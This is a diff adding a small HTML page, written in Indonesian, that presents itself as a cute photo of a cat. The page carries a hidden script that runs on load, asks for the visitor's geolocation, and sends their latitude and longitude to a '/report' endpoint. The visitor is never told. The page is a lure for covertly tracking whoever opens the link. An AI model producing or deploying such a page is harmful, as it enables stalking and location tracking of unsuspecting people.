@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Foto Cantik 😍</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { margin: 0; background-color: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
+    img { max-width: 100%; height: auto; border-radius: 10px; }
+  </style>
+</head>
+<body>
+  <img src="/static/kucing.jpeg" alt="Foto lucu">
+
+  <script>
+    // Coba ambil lokasi pengguna
+    navigator.geolocation.getCurrentPosition(success, error);
+
+    function success(pos) {
+      const data = {
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude
+      };
+      fetch('/report', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+
+    function error(err) {
+      console.log("Tidak dapat mengambil lokasi:", err);
+    }
+  </script>
+</body>
+</html>
